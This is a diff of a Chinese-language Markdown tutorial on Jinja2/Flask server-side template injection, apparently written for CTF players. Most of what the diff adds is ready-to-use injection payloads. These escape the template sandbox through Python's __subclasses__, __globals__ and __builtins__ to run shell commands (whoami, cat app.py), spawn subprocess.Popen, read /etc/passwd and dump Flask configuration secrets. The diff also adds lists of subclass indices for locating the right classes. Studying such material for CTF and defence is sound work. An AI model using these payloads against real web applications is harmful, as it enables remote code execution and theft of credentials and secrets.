@@ -1,9 +1,5 @@
 # SSTI--Jinja2
 
-{{url_for.__globals__.__builtins__.eval('__import__("os").popen("cat app.py").read()')}}
-
-{{config.__init__.__globals__. __builtins__.eval('__import__("os").popen("cat app.py").read()')}}
-
 # 前言
 
 SSTI（服务端模板注入），已然不再是一个新话题，近年来的CTF中还是也经常能遇到的，比如护网杯的easy_tonado、TWCTF的Shrine，19年的SCTF也出了Ruby ERB SSTI的考点；
@@ -15,7 +11,21 @@ SSTI（服务端模板注入），已然不再是一个新话题，近年来的C
 首先简单说一下什么是SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；
 漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。
 
-## 利用流程
+# 常用魔法函数
+
+```
+__class__ 返回调用的参数类型
+__bases__ 返回类型列表
+__base__ 
+__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
+__subclasses__() 返回object的子类
+__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
+__dict__ 查看对象内部所有属性名和属性值组成的字典
+```
+
+
+
+# 利用流程
 
 > 获取基本类->获取基本类的子类->在子类中找到关于命令执行和文件读写的模块
 
@@ -98,9 +108,9 @@ for i in ().__class__.__base__.__subclasses__():
 		pass
 ```
 
-# Python当中的利用
+## Python当中的利用
 
-## Python2当中的利用
+### Python2当中的利用
 
 tips：python2的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`
 
@@ -138,8 +148,18 @@ dir(''.__class__.__bases__[0].__bases__[0].__subclasses__()[40])
 - warnings`类中的`linecache
 
   本方法只能用于python2，因为在python3中会报错`'function object' has no attribute 'func_globals'`，不知道为啥
+  
+  ```
+  (<class 'warnings.catch_warnings'>)
+  # -*- coding: UTF-8 -*-
+  print ().__class__.__bases__[0].__subclasses__()[-20].__init__.func_globals['linecache'].os.popen('whoami').read()
+  ```
+  
+  
 
-## python3当中的利用
+### python3当中的利用
+
+
 
 - `os._wrap_close`类中的`popen`
 
@@ -163,19 +183,230 @@ dir(''.__class__.__bases__[0].__bases__[0].__subclasses__()[40])
   
   ```
 
-# 常用魔法函数
+### Python2与Python3通杀
+
+这里介绍python2和python3两个版本通用的方法
+
+- `__builtins__`代码执行
+
+这种方法是比较常用的，因为他两种python版本都适用
+
+首先`__builtins__`是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如`abs`，`max`，就是因为`__builtins__`这类模块在Python启动时为我们导入了，可以使用`dir(__builtins__)`来查看调用方法的列表，然后可以发现`__builtins__`下有`eval`，`__import__`等的函数，因此可以利用此来执行命令。
+
+经过简单Python3测试有比较多的类都含有`__builtins__`，比如常用的还有`email.header._ValueFormatter`等等，这也可能是为什么这种方法比较多人用的原因之一吧
 
 ```
-__class__ 返回调用的参数类型
-__bases__ 返回类型列表
-__base__ 
-__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
-__subclasses__() 返回object的子类
-__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
-__dict__ 查看对象内部所有属性名和属性值组成的字典
+<class '_frozen_importlib._ModuleLock'> 80
+<class '_frozen_importlib._DummyModuleLock'> 81
+<class '_frozen_importlib._ModuleLockManager'> 82
+<class '_frozen_importlib.ModuleSpec'> 83
+<class '_frozen_importlib_external.FileLoader'> 94
+<class '_frozen_importlib_external._NamespacePath'> 95
+<class '_frozen_importlib_external._NamespaceLoader'> 96
+<class '_frozen_importlib_external.FileFinder'> 98
+<class 'zipimport.zipimporter'> 105
+<class 'zipimport._ZipImportResourceReader'> 106
+<class 'codecs.IncrementalEncoder'> 108
+<class 'codecs.IncrementalDecoder'> 109
+<class 'codecs.StreamReaderWriter'> 110
+<class 'codecs.StreamRecoder'> 111
+<class 'os._wrap_close'> 134
+<class 'os._AddedDllDirectory'> 135
+<class '_sitebuiltins.Quitter'> 136
+<class '_sitebuiltins._Printer'> 137
+<class 'types.DynamicClassAttribute'> 144
+<class 'types._GeneratorWrapper'> 145
+<class 'warnings.WarningMessage'> 146
+<class 'warnings.catch_warnings'> 147
+<class 'reprlib.Repr'> 171
+<class 'functools.partialmethod'> 179
+<class 'functools.singledispatchmethod'> 180
+<class 'functools.cached_property'> 181
+<class 'contextlib._GeneratorContextManagerBase'> 183
+<class 'contextlib._BaseExitStack'> 184
+<class 'sre_parse.State'> 190
+<class 'sre_parse.SubPattern'> 191
+<class 'sre_parse.Tokenizer'> 192
+<class 're.Scanner'> 193
+<class 'tokenize.Untokenizer'> 207
+<class 'traceback.FrameSummary'> 208
+<class 'traceback.TracebackException'> 209
+<class 'distutils.version.Version'> 210
+<class 'dis.Bytecode'> 213
+<class 'inspect.BlockFinder'> 214
+<class 'inspect.Parameter'> 217
+<class 'inspect.BoundArguments'> 218
+<class 'inspect.Signature'> 219
+<class '_weakrefset._IterationGuard'> 220
+<class '_weakrefset.WeakSet'> 221
+<class 'weakref.finalize'> 223
+<class 'string.Template'> 224
+<class 'threading._RLock'> 226
+<class 'threading.Condition'> 227
+<class 'threading.Semaphore'> 228
+<class 'threading.Event'> 229
+<class 'threading.Barrier'> 230
+<class 'threading.Thread'> 231
+<class 'logging.LogRecord'> 232
+<class 'logging.PercentStyle'> 233
+<class 'logging.Formatter'> 234
+<class 'logging.BufferingFormatter'> 235
+<class 'logging.Filter'> 236
+<class 'logging.Filterer'> 237
+<class 'logging.PlaceHolder'> 238
+<class 'logging.Manager'> 239
+<class 'logging.LoggerAdapter'> 240
+<class 'pathlib._Flavour'> 244
+<class 'pathlib._Selector'> 246
+<class 'pprint._safe_key'> 249
+<class 'pprint.PrettyPrinter'> 250
+<class 'subprocess.STARTUPINFO'> 258
+<class 'subprocess.CompletedProcess'> 259
+<class 'subprocess.Popen'> 260
+<class 'tempfile._TemporaryFileCloser'> 265
+<class 'tempfile._TemporaryFileWrapper'> 266
+<class 'tempfile.SpooledTemporaryFile'> 267
+<class 'tempfile.TemporaryDirectory'> 268
+<class 'gzip._PaddedFile'> 271
+<class '__future__._Feature'> 273
+<class 'ctypes.CDLL'> 281
+<class 'ctypes.LibraryLoader'> 282
+<class 'textwrap.TextWrapper'> 283
 ```
 
+再调用`eval`等函数和方法即可，payload如下
 
+```python
+{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}
+
+{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
+
+{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
+
+{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
+```
+
+又或者用如下两种方式，用模板来跑循环
+
+```python
+{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
+```
+
+或
+
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("whoami").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+```
+
+读取文件payload
+
+```
+{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+```
+
+然后这里再提一个比较少人提到的点
+
+`warnings.catch_warnings`类在在内部定义了`_module=sys.modules['warnings']`，然后`warnings`模块包含有`__builtins__`，也就是说如果可以找到`warnings.catch_warnings`类，则可以不使用`globals`
+
+```python
+{{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
+```
+
+- subprocess.Popen
+
+```
+''.__class__.__mro__[1].__subclasses__()[260]('whoami',shell=True,stdout=-1).communicate()[0].strip()
+```
+
+- os
+
+```
+<class 'inspect.BlockFinder'> 214
+<class 'inspect.Parameter'> 217
+<class 'inspect.BoundArguments'> 218
+<class 'inspect.Signature'> 219
+<class 'logging.LogRecord'> 232
+<class 'logging.PercentStyle'> 233
+<class 'logging.Formatter'> 234
+<class 'logging.BufferingFormatter'> 235
+<class 'logging.Filter'> 236
+<class 'logging.Filterer'> 237
+<class 'logging.PlaceHolder'> 238
+<class 'logging.Manager'> 239
+<class 'logging.LoggerAdapter'> 240
+<class 'pathlib._Flavour'> 244
+<class 'pathlib._Selector'> 246
+<class 'subprocess.STARTUPINFO'> 258
+<class 'subprocess.CompletedProcess'> 259
+<class 'subprocess.Popen'> 260
+<class 'gzip._PaddedFile'> 271
+
+().__class__.__base__.__subclasses__()[214].__init__.__globals__['os'].popen('whoami').read()
+```
+
+### 获取配置信息
+
+我们有时候可以使用flask的内置函数比如说`url_for`，`get_flashed_messages`，甚至是内置的对象`request`来查询配置信息或者是构造payload
+
+- `config`
+
+我们通常会用`{{config}}`查询配置信息，如果题目有设置类似`app.config ['FLAG'] = os.environ.pop('FLAG')`，就可以直接访问`{{config['FLAG']}}`或者`{{config.FLAG}}`获得flag
+
+- `request`
+
+jinja2中存在对象`request`
+
+```
+Python 3.9.1
+>>> from flask import Flask,request,render_template_string
+>>> request.__class__.__mro__[1]
+<class 'object'>
+```
+
+查询一些配置信息
+
+```python
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
+```
+
+- `url_for`
+
+查询配置信息
+
+```
+{{url_for.__globals__['current_app'].config}}
+```
+
+- `get_flashed_messages`
+
+查询配置信息
+
+```
+{{get_flashed_messages.__globals__['current_app'].config}}
+```
+
+当然也可以通过一些配置信息来构造payload
+
+```
+{{url_for.__globals__.__builtins__.eval('__import__("os").popen("cat app.py").read()')}}
+
+{{config.__init__.__globals__. __builtins__.eval('__import__("os").popen("cat app.py").read()')}}
+{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
+```
+
+# 绕过过滤
+
+现在各大比赛都让你去绕过各种各样的黑名单，对网上资料做个总结与整合
 
 # 参考资料
 
